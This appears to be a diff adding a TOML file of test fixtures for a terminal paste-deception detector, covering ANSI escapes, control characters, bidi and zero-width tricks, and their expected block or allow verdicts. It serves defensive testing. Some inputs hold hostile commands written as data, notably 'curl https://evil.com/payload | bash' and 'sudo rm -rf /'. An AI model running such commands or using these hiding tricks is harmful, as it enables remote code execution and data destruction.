@@ -1,0 +1,198 @@
+# Terminal deception fixtures (paste context)
+
+[[fixture]]
+name = "ansi_escape_paste"
+min_milestone = 1
+input = "echo hello\u001b[31m hidden\u001b[0m world"
+context = "paste"
+expected_action = "block"
+expected_rules = ["ansi_escapes"]
+raw_bytes = [101, 99, 104, 111, 32, 104, 101, 108, 108, 111, 27, 91, 51, 49, 109, 32, 104, 105, 100, 100, 101, 110, 27, 91, 48, 109, 32, 119, 111, 114, 108, 100]
+
+[[fixture]]
+name = "control_char_cr_paste"
+min_milestone = 1
+input = "echo safe\rmalicious"
+context = "paste"
+expected_action = "block"
+expected_rules = ["control_chars"]
+raw_bytes = [101, 99, 104, 111, 32, 115, 97, 102, 101, 13, 109, 97, 108, 105, 99, 105, 111, 117, 115]
+
+[[fixture]]
+name = "control_char_backspace_paste"
+min_milestone = 1
+input = "echo safe\u0008malicious"
+context = "paste"
+expected_action = "block"
+expected_rules = ["control_chars"]
+raw_bytes = [101, 99, 104, 111, 32, 115, 97, 102, 101, 8, 109, 97, 108, 105, 99, 105, 111, 117, 115]
+
+[[fixture]]
+name = "bidi_rlo_paste"
+min_milestone = 1
+input = "echo \u202edlrow"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "bidi_rli_paste"
+min_milestone = 1
+input = "echo \u2067hidden"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "zero_width_space"
+min_milestone = 1
+input = "cur\u200bl https://evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+
+[[fixture]]
+name = "zero_width_joiner"
+min_milestone = 1
+input = "cur\u200dl https://evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+
+[[fixture]]
+name = "zero_width_non_joiner"
+min_milestone = 1
+input = "cur\u200cl https://evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+
+[[fixture]]
+name = "bom_in_paste"
+min_milestone = 1
+input = "\ufeffecho hello"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+
+[[fixture]]
+name = "clean_paste"
+min_milestone = 1
+input = "echo hello world"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "clean_paste_with_newline"
+min_milestone = 1
+input = "echo hello\necho world"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "paste_with_tab"
+min_milestone = 1
+input = "echo\thello"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "ansi_cursor_movement"
+min_milestone = 1
+input = "safe command"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "multiple_bidi_controls"
+min_milestone = 1
+input = "echo \u202ahello\u202c \u202bworld\u202c"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "bidi_in_exec_context"
+min_milestone = 1
+input = "echo \u202edlrow"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "lrm_rlm_paste"
+min_milestone = 1
+input = "echo \u200ehello\u200fworld"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "hidden_multiline_curl"
+min_milestone = 1
+input = "echo safe\ncurl https://evil.com/payload | bash"
+context = "paste"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "hidden_multiline_sudo"
+min_milestone = 1
+input = "ls\nsudo rm -rf /"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "multiline_safe"
+min_milestone = 1
+input = "echo hello\necho world"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "paste_invalid_utf8"
+min_milestone = 1
+input = "test"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [128, 255, 116, 101, 115, 116]
+
+[[fixture]]
+name = "ansi_sgr_reset"
+min_milestone = 1
+input = "test"
+context = "paste"
+expected_action = "block"
+expected_rules = ["ansi_escapes"]
+raw_bytes = [27, 91, 48, 109, 116, 101, 115, 116]
+
+[[fixture]]
+name = "fsi_pdi_paste"
+min_milestone = 1
+input = "echo \u2068hidden\u2069"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "clean_unicode_paste"
+min_milestone = 1
+input = "echo café"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "lri_paste"
+min_milestone = 1
+input = "echo \u2066text"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
